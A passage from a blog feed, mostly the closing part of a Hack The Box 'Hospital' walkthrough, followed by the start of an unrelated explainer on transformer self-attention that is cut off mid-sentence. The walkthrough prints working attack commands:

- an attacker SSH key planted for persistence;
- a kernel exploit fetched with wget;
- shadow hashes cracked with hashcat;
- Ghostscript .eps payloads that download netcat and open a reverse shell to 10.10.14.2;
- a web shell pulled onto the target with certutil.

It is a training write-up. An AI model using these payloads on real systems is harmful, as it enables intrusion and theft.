<li><strong><code class="language-plaintext highlighter-rouge">fg</code></strong>: <ul> <li>Brings the most recent background job (your shell) to the foreground.</li> <li>Necessary if the shell was backgrounded, especially after changing terminal settings.</li> <li>May require hitting Enter to see the prompt after execution.</li> </ul> </li> </ul> <p>After the last step hit return a few times to return the prompt.</p> <p>Looking in the <code class="language-plaintext highlighter-rouge">/uploads</code> file, there are no files, so regaining a shell may be difficult.</p> <h1 id="establishing-persistence-1">Establishing Persistence</h1> <p>To avoid having to re-do the initial steps in the event of a disconnected shell, malicious SSH keys can be placed on the target.</p> <p>First, the <code class="language-plaintext highlighter-rouge">~/.ssh</code> directory is created, and appropriate write permissions confirmed..</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.ssh
<span class="nb">ls</span>: cannot access <span class="s1">'/var/www/.ssh'</span>: No such file or directory
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">mkdir</span> ~/.ssh
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">touch</span> ~/.ssh/test <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"write access confirmed"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"no write access"</span>
write access confirmed
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">rm</span> ~/.ssh/test

</code></pre></div></div> <p>Then an SSH key pair is generated on the local machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-f</span> ctf_key
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">-t rsa</code>: Specifies the type of key to create, in this case, RSA.</li> <li><code class="language-plaintext highlighter-rouge">-b 2048</code>: Specifies the number of bits in the key, in this case, 2048 bits.</li> <li><code class="language-plaintext highlighter-rouge">-f ~/.ssh/ctf_key</code>: Specifies the filename of the key; replace <code class="language-plaintext highlighter-rouge">ctf_key</code> with a name that makes sense for your situation.</li> </ul> <p>The public key is then displayed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span><span class="nb">cat </span>ctf_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn96sRU5Epi8/8T&lt;SNIP&gt;
</code></pre></div></div> <p>On the target system , the malicious public key is appended to the <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>nano ~/.ssh/authorized_keys
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn&lt;SNIP&gt;
www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Now if the shell is dropped, it may be possible to easily regain access using SSH</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/Documents/htb-machines/hospital/persistence/ctf_key www-data@hospital.htb
</code></pre></div></div> <h1 id="system-enumeration">System enumeration</h1> <p>Checking sudo permissions for the <code class="language-plaintext highlighter-rouge">www-data</code> account requires a password.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data:
</code></pre></div></div> <p>However, a review of the Linux kernel version reveals an unpatched vulnerbaility.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux webserver 5.19.0-35-generic <span class="c">#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Searching the linux kernel version reveals a potential privilege escalation vulnerability as described <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">here</a></p> <p>The vulnerability is easily exploited by downloading the exploit, serving it and retrieving it on the target machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-2640-CVE-2023-32629]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

10.129.229.189 - - <span class="o">[</span>07/Apr/2024 21:54:22] <span class="s2">"GET /exploit.sh HTTP/1.1"</span> 200 -
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>wget 10.10.14.2:80/exploit.sh
<span class="nt">--2024-04-08</span> 08:54:18--  http://10.10.14.2/exploit.sh
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 <span class="o">[</span>text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh          100%[<span class="o">===================&gt;]</span>     558  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-04-08 08:54:19 <span class="o">(</span>95.0 MB/s<span class="o">)</span> - ‘exploit.sh’ saved <span class="o">[</span>558/558]

www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Running the exploit, returns a root shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>bash exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/var/www/html#

</code></pre></div></div> <blockquote> <p><strong><em>Now would be a good time to create persistence with the root user.</em></strong></p> </blockquote> <h1 id="lateral-movement">Lateral movement</h1> <h2 id="stealing-and-cracking-hashes">Stealing and cracking hashes</h2> <p>Looking at <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, there is a hash for the <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">drwilliams</code> accounts.</p> <p><img src="/assets/img/2024-hospital/hashes-found.png" alt="hashes-found.png" class="auto-resize"/></p> <p>Stealing the hashes and running them through Hashcat cracks the <code class="language-plaintext highlighter-rouge">drwilliams</code> one.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/credentials]
└─<span class="nv">$ </span>hashcat hashes /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting <span class="k">in </span>autodetect mode
<span class="nv">$6$uWBSeTcoXXT</span>&lt;SNIP&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 <span class="o">(</span>sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">))</span>
Hash.Target......: <span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz...W192y/
Time.Started.....: Sun Apr  7 22:04:47 2024 <span class="o">(</span>1 min, 3 secs<span class="o">)</span>
Time.Estimated...: Sun Apr  7 22:05:50 2024 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:     3366 H/s <span class="o">(</span>3.58ms<span class="o">)</span> @ Accel:1024 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 215040/14344385 <span class="o">(</span>1.50%<span class="o">)</span>
Rejected.........: 0/215040 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 214016/14344385 <span class="o">(</span>1.49%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: raycharles -&gt; pakimo
Hardware.Mon.#1..: Util: 93%

Started: Sun Apr  7 22:04:28 2024
Stopped: Sun Apr  7 22:05:52 2024
</code></pre></div></div> <h2 id="business-email-compromise-1">Business email compromise</h2> <p>Now with Dr. William’s credentials, other services can be explored revealed in the initial scan, such as a webmail service running on Port 443.</p> <p><img src="/assets/img/2024-hospital/webservice.png" alt="webservice.png" class="auto-resize"/></p> <p>Trying Dr. Williams’ credentials is successful and access is obtained to the email account.</p> <p>An email in the inbox hints at another potential vector.</p> <p><img src="/assets/img/2024-hospital/email.png" alt="email.png" class="auto-resize"/></p> <h2 id="windows-movement">Windows movement</h2> <p>A google for <code class="language-plaintext highlighter-rouge">GhostScript</code> and <code class="language-plaintext highlighter-rouge">.eps</code> reveals another potential vector in the form of a remote code execution via a command injection.</p> <ul> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) (github.com)</a></li> </ul> <p>It seems the vector is to create a payload that exploited the vulnerability in the GhostScript software, and send it back to Dr. Brown to move over to that user’s machine..</p> <p>The payload is crafted by creating a malicious <code class="language-plaintext highlighter-rouge">.eps</code> file and appending a command to it. This appears to be a method that will break out into the Windows layer, as presumably Dr. Brown will read the email and open the file on a Windows machine.</p> <p>Proceeding with this theory, the Windows version of Netcat (<code class="language-plaintext highlighter-rouge">nc64.exe</code>) is required, and palced in the same directory as the exploit. A payload is created that retrieves the <code class="language-plaintext highlighter-rouge">nc64.exe</code> from a webserver</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.2:8000/nc64.exe -o nc.exe"</span> <span class="nt">--filename</span> new-design.eps
<span class="o">[</span>+] Payload successfully injected into new-design.eps.
</code></pre></div></div> <p>The binary is then served and the malicious file sent back to Dr. Brown.</p> <p><img src="/assets/img/2024-hospital/Send-netcat.png" alt="Send-netcat.png" class="auto-resize"/></p> <p>A few moments later, the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary was successfully retrieved from the server, indicating Dr. Brown has opened the malicious <code class="language-plaintext highlighter-rouge">.eps</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
10.129.229.189 - - <span class="o">[</span>07/Apr/2024 22:36:03] <span class="s2">"GET /nc64.exe HTTP/1.1"</span> 200 -
</code></pre></div></div> <p>A second payload is now crafted that will make use of the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary, and establish a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.2 1234 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div> <p>The second payload is sent via email as well.</p> <p><img src="/assets/img/2024-hospital/email-payload.png" alt="email-payload.png" class="auto-resize"/></p> <p>Then, a reverse shell is successfully caught, providing access to Dr. Brown’s Windows machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.229.189] 25203
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,790,400 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;

</code></pre></div></div> <p>The user flag is found.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL&gt;cd Desktop
<span class="nb">cd </span>Desktop

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop

10/27/2023  12:24 AM    &lt;DIR&gt;          <span class="nb">.</span>
10/27/2023  12:24 AM    &lt;DIR&gt;          ..
04/08/2024  05:18 AM                34 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,765,824 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;cat user.txt
<span class="nb">cat </span>user.txt
<span class="s1">'cat'</span> is not recognized as an internal or external <span class="nb">command</span>,
operable program or batch file.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type </span>user.txt
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation---windows">Privilege escalation - Windows</h2> <p>On Dr Brown’s machine is a bat file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,753,536 bytes free

</code></pre></div></div> <p>Reviewing the file reveals a hardcoded password.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\drbrown.HOSPITAL\Documents</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">ghostscript.bat</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">ghostscript.bat</span><span class="w">
</span><span class="err">@</span><span class="nx">echo</span><span class="w"> </span><span class="nx">off</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">filename</span><span class="o">=%</span><span class="n">~1</span><span class="w">
</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring '&lt;REDACTED&gt;' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital\drbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span><span class="nx">C:\Program</span><span class="se">` </span><span class="nx">Files\gs\gs10.01.1\bin\gswin64c.exe</span><span class="s2">" -dNOSAFER "</span><span class="nx">C:\Users\drbrown.HOSPITAL\Downloads\</span><span class="o">%</span><span class="nx">filename</span><span class="o">%</span><span class="s2">" }"</span><span class="w">

</span></code></pre></div></div> <p>The password can be tried on potential other services; for instance, RPC.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password for [WORKGROUP\drbrown]:
rpcclient $&gt;
</code></pre></div></div> <p><strong><em>A note on RPC</em></strong></p> <ul> <li>Remote Procedure Call (RPC) is a protocol that allows a program on one computer to execute a procedure (a subroutine or function) on another computer without needing to understand the network’s details. In essence, RPC abstracts the complexities of network communication, allowing developers to focus on the implementation of the function rather than the communication mechanism. This is particularly useful in distributed systems, where different parts of an application may reside on different networked computers.</li> <li>RPC operates on a client-server model. The client makes a request for a procedure to be executed on the server. The RPC system then takes care of packaging the procedure’s parameters, sending them over the network to the server, executing the requested procedure on the server with the supplied parameters, and then sending the result back to the client.</li> </ul> <p>Once the RPC shell is established, executing <code class="language-plaintext highlighter-rouge">querydispinfo</code> will return a description of the various users on the target machine.</p> <p><img src="/assets/img/2024-hospital/rpc.png" alt="rpc.png" class="auto-resize"/></p> <p>This reveals the presence of a local administrator account.</p> <p>Enumerating the directory structure further reveals the presence of the <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder.</p> <p><strong>* A note on <code class="language-plaintext highlighter-rouge">xampp\htdocs</code></strong>*</p> <ul> <li>The <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder is a directory used by XAMPP, a popular open-source cross-platform web server solution stack package. XAMPP stands for Cross-Platform (X), Apache (A), MariaDB (M), PHP (P), and Perl (P). It is designed to be an easy-to-install Apache distribution containing MariaDB, PHP, and Perl, making it a convenient tool for developers to create and test web applications on their local machines before deploying them to a live server.*</li> <li>If found on a machine in a production environment or accessible over a network, it could be a security concern. XAMPP is not designed with security in mind for production use; its default configuration is meant for development purposes only, with minimal security settings. An improperly secured XAMPP installation accessible over a network can be exploited by malicious actors.</li> </ul> <p>The permissions on the location reveal any user can read and execute to the location, and <code class="language-plaintext highlighter-rouge">NT Authority</code> has full control.</p> <p>A malicious file uploaded to the location could theoretically be executed in the context of <code class="language-plaintext highlighter-rouge">NT Authority</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; Get-Acl | Format-List

Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
Owner  : BUILTIN<span class="se">\A</span>dministrators
Group  : HOSPITAL<span class="se">\D</span>omain Users
Access : NT AUTHORITY<span class="se">\L</span>OCAL SERVICE Allow  FullControl
         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
         BUILTIN<span class="se">\U</span>sers Allow  ReadAndExecute, Synchronize
         BUILTIN<span class="se">\U</span>sers Allow  AppendData
         BUILTIN<span class="se">\U</span>sers Allow  CreateFiles
         CREATOR OWNER Allow  268435456
</code></pre></div></div> <p>The shell used earlier was re-used here. First it was served locally on the attack machine and then retrieved on the Windows target within the potentially vulnerable <code class="language-plaintext highlighter-rouge">htdocs</code> folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/p0wny-shell]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">certutil</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://10.10.14.2:8000/shell.php</span><span class="w"> </span><span class="nx">shell.php</span><span class="w">
</span></code></pre></div></div> <p>Browsing to the uploaded shell on the Windows machine successfully obtains another webshell in the context of the <code class="language-plaintext highlighter-rouge">NT Authority</code> user.</p> <p>The root flag is found.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># whoami</span><span class="w">
</span><span class="n">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">

</span><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># type c:\Users\Administrator\Desktop\root.txt</span><span class="w">
</span><span class="err">&lt;</span><span class="n">REDACTED</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="medium-box"/><category term="HTB"/><category term="insecure-file-upload"/><category term="weak-credentials"/><category term="unpatched"/><category term="command-injection"/><category term="remote-code-execution"/><category term="insecure-coding"/><category term="inappropriate-file-permissions"/><category term="local-administrator"/><category term="phar"/><category term="php"/><category term="eps"/><summary type="html"><![CDATA[Hospital - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">An overview of Transformer architecture and self-attention</title><link href="https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention/" rel="alternate" type="text/html" title="An overview of Transformer architecture and self-attention"/><published>2024-03-18T23:50:00+00:00</published><updated>2024-03-18T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention/"><![CDATA[<p>In Natural Language Processing (NLP), a transformer architecture is a type of deep learning model that has significantly improved the ability to understand and generate human language. Vaswani et al. introduced transformers in the paper “Attention is All You Need” in 2017 and distinguished them by their application of self-attention mechanisms. Self-attention mechanisms enable a model to weigh the importance of different words within a sentence, regardless of their positional distance from each other.</p> <p><strong><em>Key Features of Transformers</em></strong></p> <ul> <li><strong>Self-Attention:</strong> allows the model to dynamically focus on different parts of an input as it processes information, enabling it to effectively capture context and relationships between words.</li> <li><strong>Parallel Processing:</strong> Transformers can process entire sequences of data in parallel, which significantly speeds up training and improves the model’s ability to handle long sequences. Previous sequence models like RNNs (Recurrent Neural Networks) and LSTMs (Long-Short-Term Memory Networks) could only process data sequentially.</li> <li><strong>Layered Structure:</strong> Transformers comprise multiple layers of self-attention and feed-forward neural networks. A layered structure enables Transformers to learn complex patterns and relationships in the data, which is critical to the depth of their performance on a broad range of NLP tasks.</li> <li><strong>Scalability:</strong> Due to parallel processing and efficient training on large datasets, transformers are highly scalable, making them suitable for cases requiring an understanding of complex and nuanced language.</li> </ul> <p><strong><em>Applications</em></strong></p> <p>Many state-of-the-art NLP models, such as BERT (Bidirectional Encoder Representations from Transformers) and GPT (Generative Pretrained Transformer), have a Transformer foundation. These models have set new benchmarks in various NLP tasks, such as text classification, machine translation, question answering, and text generation.</p> <p>The transformer model’s ability to understand context and nuance in text has enabled the development of more sophisticated and interactive AI applications, and it is a cornerstone of modern NLP research.</p> <h1 id="the-architecture">The architecture</h1> <p><br/> Transformer architectures have three broad models:</p> <ul> <li>Encoders</li> <li>Decoders, and</li> <li>Encoder-Decoders (Sequence-to-Sequence)</li> </ul> <h2 id="encoders">Encoders</h2> <p>Encoders in transformers process input text into a format (vector representations) that captures the essence of the original information.</p> <blockquote> <p><strong><em>Encoder models are bidirectional.</em></strong></p> </blockquote> <p>Because encoders consider the context from both before and after a given word within the same layer, they are said to be <strong>bi-directional</strong>. Bi-directional capability contrasts with traditional models that process input in a strict uni-directional sequence (either left-to-right or right-to-left). Thus, it could only incorporate context from one direction at a time in their initial layers.</p> <p>Imagine the sentence, <em><code class="language-plaintext highlighter-rouge">The cat sat on the mat.</code></em> Bidirectionality means that when processing the word <em><code class="language-plaintext highlighter-rouge">sat</code></em>, the encoder considers the context of <em><code class="language-plaintext highlighter-rouge">The cat</code></em> (words before <em><code class="language-plaintext highlighter-rouge">sat</code></em>) and <em><code class="language-plaintext highlighter-rouge">on the mat</code></em> (words after <em><code class="language-plaintext highlighter-rouge">sat</code></em>) simultaneously. This allows the encoder to understand that <em><code class="language-plaintext highlighter-rouge">sat</code></em> is an action performed by <em><code class="language-plaintext highlighter-rouge">the cat</code></em> and it occurred <em><code class="language-plaintext highlighter-rouge">on the mat</code></em>, integrating full-sentence context into its representation of <em><code class="language-plaintext highlighter-rouge">sat</code></em>.</p> <p>In contrast, <strong>unidirectional</strong> models, such as decoders (see below), would only consider “<em><code class="language-plaintext highlighter-rouge">The cat</code></em> when first encountering <em><code class="language-plaintext highlighter-rouge">sat</code></em>, meaning it misses the contextual clues provided by <em><code class="language-plaintext highlighter-rouge">on the mat</code></em> until later layers, or not at all, depending on the model’s overall architecture.</p> <p>Bi-directional processing enables transformers to capture a more nuanced and complete understanding of language, which makes them particularly effective for tasks that require a deep understanding of context, such as sentence classification, sentiment analysis, and named entity recognition.</p> <blockquote> <p><strong><em>Encoders use self-attention layers to understand relative context.</em></strong></p> </blockquote> <p>Encoders in transformer models aim to evaluate and understand each part of the input text relative to the entire text. This is achieved by first converting each word or part of the input into a vector representation using embeddings. For each of these vector representations, the model generates three distinct vectors: <em>Query <code class="language-plaintext highlighter-rouge">(Q)</code></em>, <em>Key <code class="language-plaintext highlighter-rouge">(K)</code></em>, and <em>Value <code class="language-plaintext highlighter-rouge">(V)</code></em>. The <code class="language-plaintext highlighter-rouge">Q</code>, <code class="language-plaintext highlighter-rouge">K</code>, and <code class="language-plaintext highlighter-rouge">V</code> vectors are then utilised to calculate attention scores, determining the weight each word’s representation should assign to every other word’s representation in the input. This weighting process enables the model to determine how much ‘attention’ or importance each part of the input should give to other parts, effectively allowing each word to consider the context provided by the entire input. This mechanism, known as <strong>self-attention</strong>, is pivotal for the model’s ability to capture and utilise contextual information within the input.</p> <p>Encoder-only models are often used in tasks that require an understanding of the input, like sentence classification or named entity recognition.</p> <h2 id="decoders">Decoders</h2> <blockquote> <p><strong><em>Decoders use a masked self-attention layer.</em></strong></p> </blockquote> <p>Self-attention in decoders is said to be <strong>masked</strong>. Masking prevents a decoder from ‘seeing’ future parts of the sequence during training, ensuring each word prediction is based only on already generated words. In other words, during the generation of an output sequence, each position can only attend to positions that preceded the current position in the sequence. This constraint is crucial for text generation, where models predict the next word based on the previous ones.</p> <p>For example, imagine the decoder is generating the text <em><code class="language-plaintext highlighter-rouge">The quick brown fox.</code></em> When it’s predicting the word after <em><code class="language-plaintext highlighter-rouge">The quick,</code></em> the masked self-attention mechanism allows the decoder to consider <em><code class="language-plaintext highlighter-rouge">The</code></em> and <em><code class="language-plaintext highlighter-rouge">quick</code></em> but not <em><code class="language-plaintext highlighter-rouge">brown</code></em> or <em><code class="language-plaintext highlighter-rouge">fox</code></em> because those words are in the future relative to the current position being predicted. This masking effectively enforces a uni-directional flow of information, ensuring that the model generates each word based solely on preceding words, preserving the natural order of text generation.</p> <blockquote> <p><strong><em>Because of masked self-attention, decoders are uni-directional.</em></strong></p> </blockquote> <p>They generate output one element at a time in a forward direction. In decoders, the future context is deliberately obscured to mimic the process of creating language one word at a time, making the decoding process fundamentally uni-directional.</p> <p>If decoders were not uni-directional and could instead attend to the entire input sequence indiscriminately (similar to encoders), the integrity of the generated output sequence would be compromised. Specifically, the following issues could arise:</p> <ul> <li><em>Loss of Sequential Generation Logic:</em> Predicting the next word becomes moot if the decoder has access to future words, undermining the process of sequential text generation.</li> <li><em>Incoherent or Circular Outputs:</em> Due to premature knowledge of 